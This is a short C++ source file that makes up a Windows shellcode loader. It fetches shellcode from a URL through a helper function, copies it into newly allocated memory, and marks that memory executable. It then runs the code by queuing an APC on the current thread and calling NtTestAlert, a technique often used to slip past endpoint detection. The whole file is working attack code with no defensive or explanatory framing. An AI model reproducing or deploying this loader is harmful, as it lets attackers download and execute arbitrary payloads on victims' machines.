#include "..\..\Public.hpp"
using pNtTestAlert = NTSTATUS(NTAPI*)();

void runShellcode()
{
	std::string shellcode = GetShellcodeFromUrl();
	
	if (shellcode.size() > 0)
	{
		DWORD oldProtect;
		LPVOID Memory = VirtualAlloc(NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		mc(Memory, shellcode.c_str(), shellcode.size());
		VirtualProtect(Memory, shellcode.size(), PAGE_EXECUTE_READ, &oldProtect);

		pNtTestAlert NtTestAlert = (pNtTestAlert)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
		PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)Memory;
		QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), NULL);
		NtTestAlert();
	}
}

int main()
{
	runShellcode();
	return 0;
}